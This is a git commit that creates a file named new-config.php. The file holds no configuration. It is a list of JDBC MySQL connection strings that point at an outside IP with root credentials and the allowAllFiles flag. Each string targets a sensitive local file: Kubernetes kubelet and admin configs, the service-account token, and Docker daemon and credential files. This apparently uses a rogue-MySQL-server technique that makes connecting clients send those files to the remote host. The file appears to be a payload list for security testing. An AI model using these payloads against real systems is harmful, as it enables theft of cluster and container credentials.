b6f9d3aa7337b39a7055abd7d6e12a513187901f
Shubs <infosec-au@users.noreply.github.com>
2024-02-23 17:58:54 +0800

    Create new-config.php

---
+++ new-config.php
@@ -0,0 +1,10 @@
+my jdbc is jdbc:mysql://root:root@tcp(51.159.31.124:3306)/mydb?allowAllFiles=true&t=1
+
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fdocker%2fdaemon.json?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2froot%2f.docker%2fconfig.json?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fvar%2frun%2fsecrets%2fkubernetes.io%2fserviceaccount%2ftoken?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fadmin.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubeconfig?allowAllFiles=true&t=1
